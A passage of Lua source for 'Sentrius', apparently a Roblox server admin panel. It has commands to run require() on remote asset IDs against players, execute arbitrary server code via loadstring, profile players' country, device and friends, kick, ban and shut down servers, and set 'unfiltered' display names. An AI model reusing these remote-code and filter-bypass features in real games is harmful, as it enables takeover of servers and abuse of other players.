        notify(plr, "Sentrius", "Failed to load require(" .. scriptData.id .. ")", 3)
        print("Require Error:", module)
        return
    end
    
    local success2, err = pcall(function()
        target.Character:WaitForChild("Humanoid", 5)
        scriptData.func(module, target)
    end)
    
    if success2 then
        if target == plr then
            notify(plr, "Sentrius", "Loaded " .. scriptData.name .. " on yourself!", 3)
        else
            notify(plr, "Sentrius", "Loaded " .. scriptData.name .. " on " .. target.DisplayName .. "!", 3)
        end
    else
        notify(plr, "Sentrius", "Failed to execute " .. scriptData.name, 3)
        print(scriptData.name .. " Error:", err)
    end
end

for i, scriptData in ipairs(requireScripts) do
    local isLocked = scriptData.ownerOnly and not owna(plr)
    
    local ScriptFrame = Instance.new("Frame")
    ScriptFrame.Name = "Script_" .. i
    ScriptFrame.Size = UDim2.new(1, -12, 0, 65)
    ScriptFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    ScriptFrame.BackgroundTransparency = 0.4
    ScriptFrame.BorderSizePixel = 1
    ScriptFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
    ScriptFrame.LayoutOrder = i + 1
    ScriptFrame.Parent = scriptsContent
    
    local ScriptCorner = Instance.new("UICorner")
    ScriptCorner.CornerRadius = UDim.new(0, 6)
    ScriptCorner.Parent = ScriptFrame
    
    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(1, -125, 0, 18)
    NameLabel.Position = UDim2.new(0, 6, 0, 5)
    NameLabel.BackgroundTransparency = 1
    NameLabel.Text = i .. " | " .. scriptData.name
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.TextSize = 15
    NameLabel.Font = Enum.Font.GothamBold
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.Parent = ScriptFrame
    
    local IDLabel = Instance.new("TextLabel")
    IDLabel.Size = UDim2.new(1, -125, 0, 13)
    IDLabel.Position = UDim2.new(0, 6, 0, 24)
    IDLabel.BackgroundTransparency = 1
    IDLabel.Text = "Asset ID: " .. scriptData.id
    IDLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    IDLabel.TextSize = 11
    IDLabel.Font = Enum.Font.Gotham
    IDLabel.TextXAlignment = Enum.TextXAlignment.Left
    IDLabel.Parent = ScriptFrame
    
    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Size = UDim2.new(1, -125, 0, 11)
    StatusLabel.Position = UDim2.new(0, 6, 0, 40)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Text = scriptData.ownerOnly and "Owner-only!!" or "Free to execute"
    StatusLabel.TextColor3 = scriptData.ownerOnly and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(100, 255, 100)
    StatusLabel.TextSize = 10
    StatusLabel.Font = Enum.Font.Gotham
    StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    StatusLabel.Parent = ScriptFrame
    
    local ExecuteButton = Instance.new("TextButton")
    ExecuteButton.Size = UDim2.new(0, 110, 0, 55)
    ExecuteButton.Position = UDim2.new(1, -115, 0, 5)
    ExecuteButton.BorderSizePixel = 1
    ExecuteButton.Font = Enum.Font.GothamBold
    ExecuteButton.Parent = ScriptFrame
    
    local ExecuteCorner = Instance.new("UICorner")
    ExecuteCorner.CornerRadius = UDim.new(0, 6)
    ExecuteCorner.Parent = ExecuteButton
    
    if isLocked then
        ExecuteButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        ExecuteButton.BackgroundTransparency = 0.3
        ExecuteButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
        ExecuteButton.Text = "LOCKED"
        ExecuteButton.TextColor3 = Color3.fromRGB(150, 150, 150)
        ExecuteButton.TextSize = 14
        
        ExecuteButton.MouseButton1Click:Connect(function()
            notify(plr, "Sentrius", "This script is owner-only!", 3)
        end)
    else
        ExecuteButton.BackgroundColor3 = scriptData.color
        ExecuteButton.BackgroundTransparency = 0.3
        ExecuteButton.BorderColor3 = Color3.new(
            math.min(scriptData.color.R + 0.1, 1),
            math.min(scriptData.color.G + 0.1, 1),
            math.min(scriptData.color.B + 0.1, 1)
        )
        ExecuteButton.Text = "EXECUTE"
        ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        ExecuteButton.TextSize = 14
        
        ExecuteButton.MouseEnter:Connect(function()
            TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {
                BackgroundTransparency = 0.1,
                TextSize = 15
            }):Play()
        end)
        
        ExecuteButton.MouseLeave:Connect(function()
            TweenService:Create(ExecuteButton, TweenInfo.new(0.2), {
                BackgroundTransparency = 0.3,
                TextSize = 14
            }):Play()
        end)
        
        ExecuteButton.MouseButton1Click:Connect(function()
            executeRequire(scriptData)
        end)
    end
end

local scriptsLayout = scriptsContent:FindFirstChild("Layout")
if scriptsLayout then
    scriptsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scriptsContent.CanvasSize = UDim2.new(0, 0, 0, scriptsLayout.AbsoluteContentSize.Y + 10)
    end)
    scriptsContent.CanvasSize = UDim2.new(0, 0, 0, scriptsLayout.AbsoluteContentSize.Y + 10)
end

ScreenGui.AncestryChanged:Connect(function()
    if not ScreenGui.Parent then
        if playerListUpdateConnection then
            playerListUpdateConnection:Disconnect()
        end
        if playerListUpdateConnection2 then
            playerListUpdateConnection2:Disconnect()
        end
    end
end)
    
    -- PLAYERS TAB CONTENT
    local playersContent = tabContents["Players"]
    local playerData = {}
    
    local function getAccountCreationDate(accountAge)
        local currentDate = os.time()
        local creationTimestamp = currentDate - (accountAge * 86400)
        local date = os.date("*t", creationTimestamp)
        return string.format("%02d/%02d/%04d", date.month, date.day, date.year)
    end
    
    local function getFriendCount(userId)
        local success, friendPages = pcall(function()
            return Players:GetFriendsAsync(userId)
        end)
        
        if success then
            local count = 0
            repeat
                local friends = friendPages:GetCurrentPage()
                count = count + #friends
                if not friendPages.IsFinished then
                    pcall(function()
                        friendPages:AdvanceToNextPageAsync()
                    end)
                end
            until friendPages.IsFinished
            return count
        end
        
        return 0
    end
    
    local function updatePlayerEntry(p, isOnline)
        local userId = p.UserId
        local existingEntry = playersContent:FindFirstChild("Entry_" .. userId)
        
        if existingEntry then
            local statusIndicator = existingEntry:FindFirstChild("StatusIndicator")
            
            if isOnline then
                existingEntry.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                existingEntry.BackgroundTransparency = 0.4
                if statusIndicator then
                    statusIndicator.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
                    statusIndicator:FindFirstChild("StatusText").Text = "IN SERVER"
                end
            else
                existingEntry.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                existingEntry.BackgroundTransparency = 0.6
                if statusIndicator then
                    statusIndicator.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                    statusIndicator:FindFirstChild("StatusText").Text = "LEFT SERVER"
                end
            end
            return
        end
        
        if not playerData[userId] then
            playerData[userId] = {
                displayName = p.DisplayName,
                username = p.Name,
                accountAge = p.AccountAge,
                creationDate = getAccountCreationDate(p.AccountAge),
                isOnline = isOnline
            }
            
            task.spawn(function()
                local countryCode = "??"
                pcall(function()
                    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(p)
                end)
                
                local friendCount = getFriendCount(userId)
                
                playerData[userId].country = countryCode
                playerData[userId].friends = friendCount
                
                local entry = playersContent:FindFirstChild("Entry_" .. userId)
                if entry then
                    local countryLabel = entry:FindFirstChild("Country")
                    local friendsLabel = entry:FindFirstChild("Friends")
                    local flagLabel = entry:FindFirstChild("Flag")
                    
                    if countryLabel then
                        local fullName = countryNames[countryCode] or "Unknown"
                        countryLabel.Text = "Country: " .. countryCode .. " / " .. fullName
                    end
                    if friendsLabel then
                        friendsLabel.Text = "Friends: " .. friendCount
                    end
                    if flagLabel then
                        flagLabel.Text = countryFlags[countryCode] or "🌍"
                    end
                end
            end)
        end
        
        local data = playerData[userId]
        
        local EntryFrame = Instance.new("Frame")
        EntryFrame.Name = "Entry_" .. userId
        EntryFrame.Size = UDim2.new(1, -12, 0, 95)
        EntryFrame.BackgroundColor3 = isOnline and Color3.fromRGB(35, 35, 35) or Color3.fromRGB(25, 25, 25)
        EntryFrame.BackgroundTransparency = isOnline and 0.4 or 0.6
        EntryFrame.BorderSizePixel = 1
        EntryFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
        EntryFrame.LayoutOrder = isOnline and 1 or 2
        EntryFrame.Parent = playersContent
        
        local EntryCorner = Instance.new("UICorner")
        EntryCorner.CornerRadius = UDim.new(0, 6)
        EntryCorner.Parent = EntryFrame
        
        local StatusIndicator = Instance.new("Frame")
        StatusIndicator.Name = "StatusIndicator"
        StatusIndicator.Size = UDim2.new(0, 85, 0, 17)
        StatusIndicator.Position = UDim2.new(1, -90, 0, 4)
        StatusIndicator.BackgroundColor3 = isOnline and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(60, 60, 60)
        StatusIndicator.BorderSizePixel = 1
        StatusIndicator.BorderColor3 = isOnline and Color3.fromRGB(70, 220, 70) or Color3.fromRGB(80, 80, 80)
        StatusIndicator.Parent = EntryFrame
        
        local StatusCorner = Instance.new("UICorner")
        StatusCorner.CornerRadius = UDim.new(0, 4)
        StatusCorner.Parent = StatusIndicator
        
        local StatusText = Instance.new("TextLabel")
        StatusText.Name = "StatusText"
        StatusText.Size = UDim2.new(1, 0, 1, 0)
        StatusText.BackgroundTransparency = 1
        StatusText.Text = isOnline and "IN SERVER" or "LEFT SERVER"
        StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
        StatusText.TextSize = 8
        StatusText.Font = Enum.Font.GothamBold
        StatusText.Parent = StatusIndicator
        
        local AvatarImage = Instance.new("ImageLabel")
        AvatarImage.Size = UDim2.new(0, 45, 0, 45)
        AvatarImage.Position = UDim2.new(0, 5, 0, 5)
        AvatarImage.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        AvatarImage.BorderSizePixel = 1
        AvatarImage.BorderColor3 = Color3.fromRGB(70, 70, 70)
        AvatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
        AvatarImage.Parent = EntryFrame
        
        local AvatarCorner = Instance.new("UICorner")
        AvatarCorner.CornerRadius = UDim.new(0, 5)
        AvatarCorner.Parent = AvatarImage
        
        local FlagLabel = Instance.new("TextLabel")
        FlagLabel.Name = "Flag"
        FlagLabel.Size = UDim2.new(0, 25, 0, 25)
        FlagLabel.Position = UDim2.new(0, 5, 0, 52)
        FlagLabel.BackgroundTransparency = 1
        FlagLabel.Text = "🌍"
        FlagLabel.TextSize = 16
        FlagLabel.Font = Enum.Font.SourceSansBold
        FlagLabel.Parent = EntryFrame
        
        local DisplayNameLabel = Instance.new("TextLabel")
        DisplayNameLabel.Size = UDim2.new(1, -155, 0, 14)
        DisplayNameLabel.Position = UDim2.new(0, 55, 0, 5)
        DisplayNameLabel.BackgroundTransparency = 1
        DisplayNameLabel.Text = data.displayName
        DisplayNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        DisplayNameLabel.TextSize = 13
        DisplayNameLabel.Font = Enum.Font.GothamBold
        DisplayNameLabel.TextXAlignment = Enum.TextXAlignment.Left
        DisplayNameLabel.Parent = EntryFrame
        
        local UsernameLabel = Instance.new("TextLabel")
        UsernameLabel.Size = UDim2.new(1, -155, 0, 12)
        UsernameLabel.Position = UDim2.new(0, 55, 0, 19)
        UsernameLabel.BackgroundTransparency = 1
        UsernameLabel.Text = "@" .. data.username
        UsernameLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
        UsernameLabel.TextSize = 10
        UsernameLabel.Font = Enum.Font.Gotham
        UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left
        UsernameLabel.Parent = EntryFrame
        
        local AccountAgeLabel = Instance.new("TextLabel")
        AccountAgeLabel.Size = UDim2.new(1, -60, 0, 11)
        AccountAgeLabel.Position = UDim2.new(0, 55, 0, 33)
        AccountAgeLabel.BackgroundTransparency = 1
        AccountAgeLabel.Text = "Age: " .. data.accountAge .. " days | " .. data.creationDate
        AccountAgeLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
        AccountAgeLabel.TextSize = 9
        AccountAgeLabel.Font = Enum.Font.Gotham
        AccountAgeLabel.TextXAlignment = Enum.TextXAlignment.Left
        AccountAgeLabel.Parent = EntryFrame
        

        local deviceEmoji = "❓"
        local deviceColor = Color3.fromRGB(130, 130, 130)
        local deviceName = playerDevices[userId] or "Unknown"
        
        if deviceName == "Mobile" then
            deviceEmoji = "📱"
            deviceColor = Color3.fromRGB(100, 200, 255)
        elseif deviceName == "PC" then
            deviceEmoji = "🖥️"
            deviceColor = Color3.fromRGB(100, 255, 150)
        elseif deviceName == "Console" then
            deviceEmoji = "🎮"
            deviceColor = Color3.fromRGB(255, 180, 100)
        elseif deviceName == "Tablet" then
            deviceEmoji = "📲"
            deviceColor = Color3.fromRGB(200, 150, 255)
        end
        
        local DeviceLabel = Instance.new("TextLabel")
        DeviceLabel.Name = "Device"
        DeviceLabel.Size = UDim2.new(1, -60, 0, 11)
        DeviceLabel.Position = UDim2.new(0, 55, 0, 46)
        DeviceLabel.BackgroundTransparency = 1
        DeviceLabel.Text = "Device: " .. deviceEmoji .. " " .. deviceName
        DeviceLabel.TextColor3 = deviceColor
        DeviceLabel.TextSize = 9
        DeviceLabel.Font = Enum.Font.Gotham
        DeviceLabel.TextXAlignment = Enum.TextXAlignment.Left
        DeviceLabel.Parent = EntryFrame
        
        local FriendsLabel = Instance.new("TextLabel")
        FriendsLabel.Name = "Friends"
        FriendsLabel.Size = UDim2.new(1, -60, 0, 11)
        FriendsLabel.Position = UDim2.new(0, 55, 0, 59)
        FriendsLabel.BackgroundTransparency = 1
        FriendsLabel.Text = "Friends: Loading..."
        FriendsLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
        FriendsLabel.TextSize = 9
        FriendsLabel.Font = Enum.Font.Gotham
        FriendsLabel.TextXAlignment = Enum.TextXAlignment.Left
        FriendsLabel.Parent = EntryFrame
        
        local CountryLabel = Instance.new("TextLabel")
        CountryLabel.Name = "Country"
        CountryLabel.Size = UDim2.new(1, -60, 0, 11)
        CountryLabel.Position = UDim2.new(0, 55, 0, 72)
        CountryLabel.BackgroundTransparency = 1
        CountryLabel.Text = "Country: Loading..."
        CountryLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
        CountryLabel.TextSize = 9
        CountryLabel.Font = Enum.Font.Gotham
        CountryLabel.TextXAlignment = Enum.TextXAlignment.Left
        CountryLabel.Parent = EntryFrame
        
        task.wait(0.05)
        playersContent.CanvasSize = UDim2.new(0, 0, 0, playersContent.Layout.AbsoluteContentSize.Y + 10)
    end
    
    for _, p in ipairs(Players:GetPlayers()) do
        updatePlayerEntry(p, true)
    end
    
    local playerAddedConnection = Players.PlayerAdded:Connect(function(p)
        if playerData[p.UserId] then
            playerData[p.UserId].isOnline = true
            updatePlayerEntry(p, true)
        else
            updatePlayerEntry(p, true)
        end
    end)
    
    local playerRemovingConnection = Players.PlayerRemoving:Connect(function(p)
        if playerData[p.UserId] then
            playerData[p.UserId].isOnline = false
            updatePlayerEntry(p, false)
        end
    end)
    

    CloseButton.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    

    ScreenGui.AncestryChanged:Connect(function()
        if not ScreenGui.Parent then
            if playerAddedConnection then
                playerAddedConnection:Disconnect()
            end
            if playerRemovingConnection then
                playerRemovingConnection:Disconnect()
            end
            if banRefreshConnection then
                banRefreshConnection:Disconnect()
            end
        end
    end)
    

    switchTab(defaultTab)
end

addCommand({
    name = "cmds",
    aliases = {"commands", "help"},
    desc = "Show command list",
    usage = prefix .. "cmds",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        openDashboard(plr, "Commands")
    end
})


addCommand({
    name = "whitelists",
    aliases = {"wls", "wllist"},
    desc = "Show all whitelisted players",
    usage = prefix .. "wls",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        openDashboard(plr, "Whitelist")
    end
})


addCommand({
    name = "playerinfo",
    aliases = {"pinfo", "tracker", "players"},
    desc = "Open player tracker",
    usage = prefix .. "playerinfo",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        openDashboard(plr, "Players")
    end
})

addCommand({
    name = "rejoin",
    aliases = {"rj"},
    desc = "Rejoin a player to the server",
    usage = prefix .. "rejoin [player (optional)]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        local targets = {plr}
        
        if args and #args > 0 then
            targets = GetPlayer(args[1], plr)
            if not targets or #targets == 0 then
                notify(plr, "Sentrius", "No player found matching that name!", 3)
                return
            end
        end
        
        local TeleportService = game:GetService("TeleportService")
        local placeId = game.PlaceId
        local jobId = game.JobId
        
        local names = {}
        for _, target in ipairs(targets) do
            pcall(function()
                TeleportService:TeleportToPlaceInstance(placeId, jobId, target)
            end)
            table.insert(names, target.DisplayName)
        end
        
        if #targets == 1 and targets[1] == plr then
        else
            notify(plr, "Sentrius", "Rejoining: " .. table.concat(names, ", "), 3)
        end
    end
})

addCommand({
    name = "serverlock",
    aliases = {"slock", "lockserver"},
    desc = "Lock the server!!",
    usage = prefix .. "serverlock",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if _G.ServerLocked then
            notify(plr, "Sentrius", "Server is already locked!", 3)
            return
        end
        
        _G.ServerLocked = true
        
        notify(plr, "Sentrius", "Server locked! Only whitelisted players can join now.", 3)
    end
})

addCommand({
    name = "unserverlock",
    aliases = {"unslock", "unlockserver"},
    desc = "Unlock the server",
    usage = prefix .. "unserverlock",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not _G.ServerLocked then
            notify(plr, "Sentrius", "Server is not locked!", 3)
            return
        end
        
        _G.ServerLocked = false
        notify(plr, "Sentrius", "Server unlocked! Anyone can join now.", 3)
    end
})

addCommand({
    name = "findgear",
    aliases = {"fgear"},
    desc = "find gears",
    usage = prefix .. "fgear [player] [gear name] or " .. prefix .. "fgear [gear name]",
    callback = function(plr, args)
        if not args or #args == 0 then 
            notify(plr, "Sentrius", "darn it, no args..", 3)
            return 
        end
        
        local targets = {plr}
        local gearSearchStart = 1 
        
        if args[1] and checker(args[1]) then
            targets = GetPlayer(args[1], plr)
            if typeof(targets) ~= "table" then targets = {targets} end
            if not targets or #targets == 0 then 
                targets = {plr}
                gearSearchStart = 1
            else
                gearSearchStart = 2 
            end
        end
        
        local gearName = table.concat(args, " ", gearSearchStart)
        if not gearName or gearName == "" then 
            notify(plr, "Sentrius", "no gear name? returning nothing then..", 3)
            return 
        end

        local HttpService = game:GetService("HttpService")
        local InsertService = game:GetService("InsertService")
        local encoded = HttpService:UrlEncode(gearName)
        local url = "https://catalog.roproxy.com/v1/search/items?category=Accessories&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=Gear&Keyword=" .. encoded

        local success, response = pcall(function()
            return HttpService:GetAsync(url)
        end)
        
        if not success or not response then 
            notify(plr, "Sentrius", "Failed to connect to Roblox catalog. Try again!", 3)
            return 
        end

        local data = HttpService:JSONDecode(response)
        
        if not data or not data.data or #data.data == 0 then 
            notify(plr, "Sentrius", "No gear found matching '" .. gearName .. "'. Try a different name maybe!!", 4)
            return 
        end
        
        local foundGear = data.data[1]
        local gearId = foundGear.id
        local foundGearName = foundGear.name or "Unknown"
        
        local searchLower = gearName:lower()
        local foundLower = foundGearName:lower()

        local gearSuccess, gear = pcall(function()
            return InsertService:LoadAsset(gearId)
        end)
        
        if not gearSuccess or not gear then
            notify(plr, "Sentrius", "Failed to load gear. The item might be broken or unavailable.", 4)
            return
        end
        
        local item = gear:FindFirstChildOfClass("Tool")
        if not item then
            gear:Destroy()
            notify(plr, "Sentrius", "The item found is not a valid gear/tool.", 3)
            return
        end
        
        for _, t in ipairs(targets) do
            if t:FindFirstChild("Backpack") then
                item:Clone().Parent = t.Backpack
            end
        end
        
        gear:Destroy()
    end
})

addCommand({
    name = "whitelist",
    aliases = {"wl", "twl"},
    desc = "Add player to temp whitelist (Owner only)",
    usage = prefix .. "wl [player]",
    callback = function(plr, args)
        if not owna(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Please specify a player to whitelist.", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "Player not found.", 3)
            return
        end
        
        for _, p in ipairs(targets) do
            if p.UserId == plr.UserId then
                notify(plr, "Sentrius", "You cannot whitelist yourself.", 3)
                return
            elseif whitelist[p.UserId] then
                notify(plr, "Sentrius", p.DisplayName .. " is already permanently whitelisted.", 3)
                return
            elseif tempwl[p.UserId] then
                notify(plr, "Sentrius", p.DisplayName .. " is already temporarily whitelisted.", 3)
                return
            else
                tempwl[p.UserId] = true
                notify(plr, "Sentrius", p.DisplayName .. " has been temporarily whitelisted.", 3)
                notify(p, "Sentrius", "You have been temporarily whitelisted!\nSay (" .. prefix .. "cmds) to view the commands!", 4)
            end
        end
    end
})

addCommand({
    name = "removewhitelist",
    aliases = {"rwl", "unwl"},
    desc = "Remove player from temp whitelist (Owner only)",
    usage = prefix .. "rwl [player]",
    callback = function(plr, args)
        if not owna(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Please specify a player to remove from whitelist.", 3)
            return
        end
        
        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then
            notify(plr, "Sentrius", "Player not found.", 3)
            return
        end
        
        for _, p in ipairs(targets) do
            if whitelist[p.UserId] then
                notify(plr, "Sentrius", p.DisplayName .. " is permanently whitelisted and cannot be removed.", 4)
                return
            elseif tempwl[p.UserId] then
                tempwl[p.UserId] = nil
                notify(plr, "Sentrius", p.DisplayName .. " has been removed from the temporary whitelist.", 3)
                notify(p, "Sentrius", "You have been removed from the temporary whitelist!", 3)
            else
                notify(plr, "Sentrius", p.DisplayName .. " is not temporarily whitelisted.", 3)
                return
            end
        end
    end
})

addCommand({
    name = "ss",
    aliases = {"s", "run"},
    desc = "Run server code",
    usage = prefix .. "ss [code]",
    callback = function(plr, args)
        if not owna(plr) then return end
        if not args or #args == 0 then return end

        local source = table.concat(args, " ")
        if source == "" then return end

        local func, compileerror = loadstring(source)
        if not func then
            notify(plr, "Sentrius", "Compile error: " .. tostring(compileerror), 6)
            return end

        local env = setmetatable({
            player = plr
        }, {
            __index = getfenv()
        })

        setfenv(func, env)

        local ok, runtimeerror = pcall(func)
        if not ok then
            notify(plr, "Sentrius", "Runtime error: " .. tostring(runtimeerror), 6)
            return end

        notify(plr, "Sentrius", "Server code executed.", 4)
    end
})

addCommand({
    name = "clr",
    aliases = {},
    desc = "Clear workspace parts",
    usage = prefix .. "clr",
    callback = function(plr, args)
        if not isAdmin(plr) then return end

        _G.btoolsparts = {}
        
        for _, v in ipairs(ws:GetChildren()) do
            if v:IsA("BasePart")
            and v.Name ~= "Terrain"
            and not Players:FindFirstChild(v.Name) then
                v:Destroy()
            end
        end

        for _, v in ipairs(ws:GetDescendants()) do
            if (v:IsA("Decal") or v:IsA("ParticleEmitter"))
            and v.Name ~= "face" then
                v:Destroy()
            end
        end
    end
})

addCommand({
    name = "kick",
    aliases = {"k"},
    desc = "Kick a player",
    usage = prefix .. "kick [player] [reason]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end

        local targets = GetPlayer(args[1], plr)
        if not targets or #targets == 0 then return end

        local reason = table.concat(args, " ", 2)
        if reason == "" then reason = "No Reason Provided." end

        local names = {}
        for _, p in ipairs(targets) do
            if not (owna(p) and not owna(plr)) then
                p:Kick(reason)
                table.insert(names, p.DisplayName)
            end
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Kicked: " .. table.concat(names, ", "), 3)
        end
    end
})

addCommand({
    name = "antialt",
    aliases = {},
    desc = "Toggle anti-alt system",
    usage = prefix .. "antialt [true/false] [min age]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        local state = tostring(args[1] or ""):lower()
        if state == "true" then
            AntiAltEnabled = true
            local age = tonumber(args[2])
            if age then
                MIN_ACCOUNT_AGE = age
            end

            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= plr and isAlt(p) then
                    handleAlt(p)
                end
            end
            
            notify(plr, "Sentrius", "Minimum account age: " .. MIN_ACCOUNT_AGE .. " days\nanti alt has been turned on.", 5)

        elseif state == "false" then
            AntiAltEnabled = false
            notify(plr, "Sentrius", "anti alt has been turned off!!", 4)
        end
    end
})

addCommand({
    name = "pban",
    aliases = {"ban"},
    desc = "Permanently ban a player",
    usage = prefix .. "pban [player] [reason]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end

        local targets = GetPlayer(args[1], plr)
        local reason = table.concat(args, " ", 2)
        if reason == "" then reason = "No Reason Provided." end

        local names = {}
        for _, p in ipairs(targets) do
            if owna(p) and not owna(plr) then
                return
            end

            if not table.find(bannedIds, p.UserId) then
                table.insert(bannedIds, p.UserId)
                local v = Instance.new("IntValue")
                v.Name = tostring(p.UserId)
                v.Value = p.UserId
                v.Parent = banFolder
            end

            p:Kick("[Sentrius]: Permanently banned\nReason: " .. reason)
            table.insert(names, p.DisplayName)
        end
        
        if #names > 0 then
            notify(plr, "Sentrius", "Permanently banned: " .. table.concat(names, ", "), 4)
        end
    end
})

addCommand({
    name = "unpban",
    aliases = {"unban"},
    desc = "Unban a player by username or display name",
    usage = prefix .. "unpban [username/displayname]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        if not args or #args == 0 then
            notify(plr, "Sentrius", "Specify a username or display name to unban!", 3)
            return
        end
        
        local searchName = table.concat(args, " "):lower()
        
        local foundBan = nil
        local foundUserId = nil
        local foundName = nil
        
        for _, banValue in ipairs(banFolder:GetChildren()) do
            local userId = tonumber(banValue.Name)
            if userId then
                local success, result = pcall(function()
                    return Players:GetNameFromUserIdAsync(userId)
                end)
                
                if success and result then
                    local username = result:lower()
                    
                    local displaySuccess, displayResult = pcall(function()
                        return Players:GetUserIdFromNameAsync(result)
                    end)
                    
                    if username:find(searchName, 1, true) or username == searchName then
                        foundBan = banValue
                        foundUserId = userId
                        foundName = result
                        break
                    end
                end
            end
        end
        
        if not foundBan then
            notify(plr, "Sentrius", "No banned user found matching '" .. table.concat(args, " ") .. "'.\nCheck your spelling!", 4)
            return
        end
        
        local indexToRemove = table.find(bannedIds, foundUserId)
        if indexToRemove then
            table.remove(bannedIds, indexToRemove)
        end
        
        foundBan:Destroy()
        
        notify(plr, "Sentrius", "Successfully unbanned '" .. foundName .. "' (ID: " .. foundUserId .. ")!\nThey can rejoin now.", 4)
    end
})

addCommand({
    name = "shutdown",
    aliases = {"sd"},
    desc = "Shutdown the server",
    usage = prefix .. "shutdown [reason]",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        local r = table.concat(args, " ")
        if r == "" then r = "No Reason Provided." end
        
        for _, p in ipairs(Players:GetPlayers()) do
            p:Kick("[Sentrius]: Server shutdown\nReason: " .. r)
        end
        task.wait(1)
        game:Shutdown()
    end
})

addCommand({
    name = "restoremap",
    aliases = {"rmap", "maprestore"},
    desc = "Restore the map to original state",
    usage = prefix .. "restoremap",
    callback = function(plr, args)
        if not isAdmin(plr) then return end
        
        for _, obj in ipairs(workspace:GetChildren()) do
            if not obj:IsA("Terrain")
               and not Players:GetPlayerFromCharacter(obj)
               and obj.Name ~= "Camera" then
                
                pcall(function()
                    obj:Destroy()
                end)
            end
        end
        
        for _, obj in ipairs(workspace.Terrain:GetChildren()) do
            pcall(function()
                obj:Destroy()
            end)
        end
        
        local SavedTabby = mapBackup:FindFirstChild("Tabby")
        if SavedTabby then
            pcall(function()
                SavedTabby:Clone().Parent = workspace
            end)
        end
        
        local Saved_Game = mapBackup:FindFirstChild("_Game")
        if Saved_Game then
            pcall(function()
                Saved_Game:Clone().Parent = workspace.Terrain
            end)
        end
        
        local scriptsToRestart = {
            "Touch Kohls Admin",
            "Killer",
            "Regen"
        }
        
        for _, scriptName in ipairs(scriptsToRestart) do
            local script = game:GetService("ServerScriptService"):FindFirstChild(scriptName)
            if script and script:IsA("Script") then
                script.Enabled = false
                task.wait(0.1)
                script.Enabled = true
            end
        end
        
        for _, p in ipairs(Players:GetPlayers()) do
            pcall(function()
                p:LoadCharacter()
            end)
        end
        
        notify(plr, "Sentrius", "Map restored!", 3)
    end
})

addCommand({
    name = "unload",
    aliases = {"ul"},
    desc = "Unload Sentrius admin system (owners only!!)",
    usage = prefix .. "unload",
    callback = function(plr, args)
        if not owna(plr) then return end
        
        local hint = Instance.new("Hint", ws)
        hint.Text = "Sentrius has been unloaded!"
        
        task.wait(1.5)

        running = false
        AntiAltEnabled = false
        tempwl = {}
        playerNames = {}
        
        for _, c in pairs(connections) do
            if typeof(c) == "RBXScriptConnection" then
                c:Disconnect()
            end
        end
        
        connections = {}
        commands = {}
        commandInfo = {}
        bannedIds = {}
        
        if banFolder and banFolder.Parent then
            banFolder:Destroy()
        end
        
        if vault and vault.Parent then
            vault:Destroy()
        end
        

        for _, p in ipairs(Players:GetPlayers()) do
            local pg = p:FindFirstChild("PlayerGui")
            if pg then
                local guiNames = {
                    "SentriusDashboard",
                    "SentriusNotification_",
                    "SentriusRequireGUI",
                    "SentriusPlayerTracker",
                    "SentriusCmdBar"
                }
                
                for _, guiName in ipairs(guiNames) do
                    if guiName:sub(-1) == "_" then
                        for _, gui in ipairs(pg:GetChildren()) do
                            if gui:IsA("ScreenGui") and gui.Name:sub(1, #guiName) == guiName then
                                gui:Destroy()
                            end
                        end
                    else
                        local gui = pg:FindFirstChild(guiName)
                        if gui then
                            gui:Destroy()
                        end
                    end
                end
            end
        end
        
        hint:Destroy()
        
        _G.SentriusLoaded = false
    end
})

addCommand({
    name = "rename",
    aliases = {"rn", "name"},
    desc = "Change a player's display name (unfiltered)",
